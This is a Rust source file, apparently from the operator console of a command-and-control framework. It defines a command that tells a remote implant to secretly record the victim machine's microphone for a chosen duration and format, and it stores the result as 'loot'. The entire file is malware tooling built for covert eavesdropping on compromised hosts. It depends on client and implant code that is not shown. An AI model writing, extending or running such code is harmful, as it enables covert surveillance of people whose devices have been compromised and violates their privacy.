//! Audio capture commands

use anyhow::Result;
use common::ImplantId;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// Capture audio from the implant's microphone for the specified duration
///
/// # Arguments
/// * `duration_secs` - Duration in seconds to record audio
/// * `format` - Optional audio format (e.g. "wav", "mp3"); defaults to implant default if None
pub async fn capture(cli: &CliState, duration_secs: u32, format: Option<String>) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    let fmt = format.as_deref().unwrap_or("wav");
    print_info(&format!("Capturing {} seconds of audio (format: {})...", duration_secs, fmt));

    // Format: "duration_secs\0format"
    let mut task_data = duration_secs.to_string().into_bytes();
    task_data.push(0);
    task_data.extend_from_slice(fmt.as_bytes());

    let task_id = cli.client.dispatch_task(implant_id, "audio", task_data).await?;
    print_success(&format!("Audio capture task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Recording will be saved to loot once complete");

    Ok(())
}
